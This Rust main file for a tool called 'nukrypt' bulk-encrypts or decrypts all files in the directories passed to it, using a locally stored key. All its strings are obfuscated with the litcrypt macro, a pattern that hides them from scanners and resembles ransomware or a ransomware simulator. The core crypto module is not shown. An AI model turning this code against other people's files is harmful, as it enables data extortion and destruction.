mod crypto;

use std::env;
use std::path::Path;
use std::time::Instant;

use litcrypt::{use_litcrypt, lc};


macro_rules! nukrypt_key_path { () => { lc!("nukrypt.key") } }
macro_rules! nukrypt_banner { () => { lc!("Usage: nukrypt [encrypt|decrypt] [dir]..") } }

use_litcrypt!("nukrypt");


fn main() {
    let key_exists: bool;
    let mut decrypt: bool = false;
    let mut key = [0u8; crypto::SIZE_KEY];

    let args: Vec<_> = env::args().collect();

    if args.len() < 3 {
        println!("{}", nukrypt_banner!());
        return;
    }

    match crypto::read_key(nukrypt_key_path!().as_str(), &mut key) {
        Ok(_)  => { key_exists = true },
        Err(_) => { key_exists = false }
    }

    if args[1].eq(lc!("decrypt").as_str()) {
        if ! key_exists {
            println!("{} {}", lc!("[!] Failed to read encryption key from"), nukrypt_key_path!());
            return;
        }

        decrypt = true;
    }
    else
    if args[1].eq(lc!("encrypt").as_str()) {
        if key_exists {
            println!("{} {}\n", lc!("[+] Encryption key read from"), nukrypt_key_path!());
        }
        else {
            key = crypto::gen_key();

            match crypto::write_key(nukrypt_key_path!().as_str(), &key) {
                Ok(_)  => println!("{} {}\n", lc!("[+] Encryption key saved to"), nukrypt_key_path!()),
                Err(_) => {
                    println!("{} {}", lc!("[!] Failed to write encryption key to"), nukrypt_key_path!());
                    return;
                }
            }
        }
    }
    else {
        println!("{}", nukrypt_banner!());
        return;
    }

    for i in 2..args.len() {
        if ! Path::new(&args[i]).is_dir() {
            println!("{} {}", lc!("[!] No such directory:"), &args[i]);
            return;
        }
    }

    let mut counter : usize = 0;
    let before = Instant::now();

    for i in 2..args.len() {
        if ! Path::new(&args[i]).is_dir() {
            println!("{} {}", lc!("[!] No such directory:"), &args[i]);
            return;
        }

        if decrypt {
            counter += crypto::decrypt_dir(&args[i], &key).unwrap();
        }
        else {
            counter += crypto::encrypt_dir(&args[i], &key).unwrap();
        }
    }

    if decrypt {
        println!(
            "\n{} {} {} {:.3} {}", lc!("[+]"), counter, lc!("files decrypted in"),
            (before.elapsed().as_millis() as f32) / 1000.0, lc!("seconds")
        );
    }
    else {
        println!(
            "\n{} {} {} {:.3} {}", lc!("[+]"), counter, lc!("files encrypted in"),
            (before.elapsed().as_millis() as f32) / 1000.0, lc!("seconds")
        );
    }
}